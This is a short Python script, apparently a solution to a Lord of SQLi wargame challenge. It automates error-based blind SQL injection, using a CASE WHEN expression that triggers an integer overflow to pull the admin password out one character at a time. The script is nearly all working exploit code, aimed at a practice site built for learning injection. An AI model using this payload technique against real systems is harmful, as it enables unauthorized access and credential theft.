import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookie = {"PHPSESSID":"2evml88c628kabc2j1vfk63ks9"}

print("🖤 Start SQLi...")

ans = ""
end = False

for i in range(1, 100):
    if(end==True):
        print(f">> There's No Letter {i-1}")
        break
    end = True
    print(f"🖤 Checking letter {i}...")
    for asc in range(48, 127):
        search = ans+chr(asc)
        payload = f"?pw=' || CASE WHEN id='admin' and pw like '{search}%25' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END %23"
        res = requests.get(url+payload, cookies=cookie)
        if("login_chk" in res.text):
            continue
        elif("error" in res.text):
            print(f">> Letter {i} → {chr(asc)}")
            ans+=chr(asc)
            end = False
            break

print(f"🖤 Answer : {ans}")
        
